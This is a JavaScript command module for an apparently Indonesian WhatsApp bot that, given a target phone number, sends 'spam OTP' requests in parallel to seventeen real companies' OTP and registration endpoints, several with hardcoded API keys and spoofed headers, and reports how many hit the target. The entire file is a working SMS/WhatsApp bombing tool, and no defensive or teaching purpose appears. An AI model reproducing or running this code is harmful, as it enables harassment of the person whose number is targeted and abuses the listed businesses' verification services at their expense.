import axios from 'axios'

export default {
    cmd: ['spamotp', 'otp'],
    category: 'tools',
    description: 'Kirim spam OTP ke nomor target',

    run: async (m, { sock, text, prefix, cmd, isOwner, config }) => {
        const user = global.db.data.users[m.sender]
        const isPremium = user?.premium && user?.premiumTime > Date.now()

        if (!isPremium && !isOwner) {
            return m.reply('Fitur ini khusus untuk user *Premium* atau *Owner*.')
        }

        if (!text) {
            return m.reply(
                `📌 *Cara Penggunaan*\n\n` +
                `*Contoh:*\n` +
                `${prefix + cmd} 628xxxx\n`
            )
        }

        const phone = formatPhone(text)
        const p08 = '0' + phone.slice(2)
        const p62 = phone

        const endpoints = buildEndpoints(p08, p62)

        await m.reply(`Mengirim OTP ke *${p62}*...`)

        const result = await sendAllRequests(endpoints)
        const response = buildResponse(p62, result)

        await sock.sendMessage(m.from, { text: response }, { quoted: m })
    }
}

function formatPhone(text) {
    let phone = text.replace(/[^0-9]/g, '')
    if (phone.startsWith('0')) phone = '62' + phone.slice(1)
    if (!phone.startsWith('62')) phone = '62' + phone
    return phone
}

function buildEndpoints(p08, p62) {
    return [
        {
            url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation',
            data: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' }
        },
        {
            url: 'https://internetrakyat.id/api/app/auth/send-otp-register',
            data: { phone_number: p08 },
            headers: { 'x-api-key': '280999!FTTH' }
        },
        {
            url: 'https://www.bonusbelanja.com/api/auth/registration/app',
            data: { phone: p62, name: 'user', agreeTnc: true, agreeContact: false }
        },
        {
            url: 'https://www.alodokter.com/resend-otp',
            data: {
                user: { phone: p08, uuid: 'f6bd0911-888f-4b3d-b189-2edf0e8e5e4e' },
                request_via: 'whatsapp'
            }
        },
        {
            url: 'https://api.dokterin.id/user/v1/users/login',
            data: { phone: p62, tnc_accept: true }
        },
        {
            url: 'https://api.maulagi.id/api/v2/auth/check',
            data: { credentials: p08 },
            headers: { 'X-ML-KEY': 'E58RLKYI58' }
        },
        {
            url: 'https://cms.bunda.co.id/api/v1/auth/send-otp',
            data: {
                phone_number: p62.replace('62', ''),
                country_code: '62',
                type: 'auth'
            }
        },
        {
            url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode',
            data: { phone_number: p08 }
        },
        {
            url: `https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/${p62}?sms=false`,
            method: 'GET',
            headers: { 'x-recaptcha': 'acf49209:033951e692315ba' }
        },
        {
            url: 'https://register.paper.id/api/v1/auth/register/send-otp',
            data: { phone: p62, method: 'whatsapp', registered_by: 'web' }
        },
        {
            url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
            data: {
                accountType: 'customers',
                applicationType: 'Pinhome Web',
                countryCode: '62',
                medium: 'whatsapp',
                otpType: 'register',
                phoneNumber: p62.replace('62', '')
            }
        },
        {
            url: 'https://www.beautyhaul.com/ajax/account/send_otp',
            data: { method: 'WhatsApp', phone: p62 }
        },
        {
            url: 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
            data: {
                action: 'REGISTER_OTP',
                channel: 'WHATS_APP',
                recipient: p62,
                recaptchaToken: ''
            }
        },
        {
            url: 'https://www.rumah123.com/api/otp/request-otp',
            data: {
                ipAddress: '36.67.110.51',
                phoneNumber: p62,
                portalId: 1,
                type: 'WHATSAPP',
                url: 'https://www.rumah123.com/user/login'
            },
            headers: { 'Base-Url-Core': 'https://www.rumah123.com' }
        },
        {
            url: 'https://beta.api.saturdays.com/api/v1/user/otp/send',
            data: {
                number: p62.replace('62', ''),
                country_code: '+62',
                type: ''
            },
            headers: {
                'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj',
                'country-code': 'ID'
            }
        },
        {
            url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id',
            data: {
                nama_lengkap: 'User',
                telepon: p08,
                email: 'user@mail.com'
            },
            headers: { 'Xid': '1080504480', 'source': 'ocistok' }
        },
        {
            url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
            data: {
                mobileNumber: p62.replace('62', ''),
                type: 'prospect-create',
                channel: 'whatsapp'
            }
        }
    ]
}

async function sendRequest(endpoint) {
    const config = {
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            ...(endpoint.headers || {})
        },
        timeout: 10000
    }

    try {
        let response
        if (endpoint.method === 'GET') {
            response = await axios.get(endpoint.url, config)
        } else {
            response = await axios.post(endpoint.url, endpoint.data, config)
        }

        if (response.status === 200 || response.status === 201) {
            return { success: true, status: response.status }
        }
        return { success: false, status: response.status }
    } catch (error) {
        if (error.response) {
            return { success: false, status: error.response.status }
        }
        return { success: false, status: 0 }
    }
}

async function sendAllRequests(endpoints) {
    let success = 0
    let failed = 0
    const details = []

    const results = await Promise.allSettled(
        endpoints.map(async (ep, index) => {
            const result = await sendRequest(ep)
            return { ...result, index }
        })
    )

    for (const result of results) {
        if (result.status === 'fulfilled' && result.value.success) {
            success++
        } else {
            failed++
        }
        if (result.status === 'fulfilled') {
            details.push({
                index: result.value.index,
                success: result.value.success,
                status: result.value.status
            })
        }
    }

    return {
        success,
        failed,
        total: endpoints.length,
        details
    }
}

function buildResponse(phone, result) {
    let text =
        `✅ *Hasil Spam OTP*\n\n` +
        `📱 *Target:* ${phone}\n` +
        `📬 *Total:* ${result.total}\n` +
        `✔️ *Berhasil:* ${result.success}\n` +
        `❌ *Gagal:* ${result.failed}\n\n`

    if (result.details && result.details.length > 0) {
        const successList = result.details.filter(d => d.success).map(d => `✅ #${d.index + 1}`)
        const failedList = result.details.filter(d => !d.success).map(d => `❌ #${d.index + 1}`)

        if (successList.length > 0) {
            text += `*Berhasil:* ${successList.join(' ')}\n`
        }
        if (failedList.length > 0) {
            text += `*Gagal:* ${failedList.join(' ')}\n`
        }
    }

    return text
}
